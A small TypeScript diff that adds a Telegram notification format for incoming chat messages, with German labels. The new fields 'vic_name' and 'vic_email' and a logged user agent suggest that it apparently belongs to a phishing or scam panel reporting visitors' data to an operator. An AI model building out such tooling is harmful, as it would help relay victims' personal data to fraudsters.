@@ -136,6 +136,15 @@ function formatMessage(event: TelegramEvent, p: Payload): string {
         p.userAgent ? `🖥️ UA: ${esc(p.userAgent)}` : null,
       ].filter(Boolean).join("\n");
 
+    case "chat_message_received":
+      return [
+        `💬 <b>Neue Chat-Nachricht</b>`,
+        `👤 ${esc(p.vic_name || "Unbekannt")}`,
+        p.vic_email ? `📧 ${code(p.vic_email)}` : null,
+        ``,
+        `<i>${esc(p.preview || "")}</i>`,
+      ].filter(Boolean).join("\n");
+
     case "test":
       return `🔔 <b>Test-Nachricht</b>\nDie Telegram-Anbindung funktioniert.`;
   }
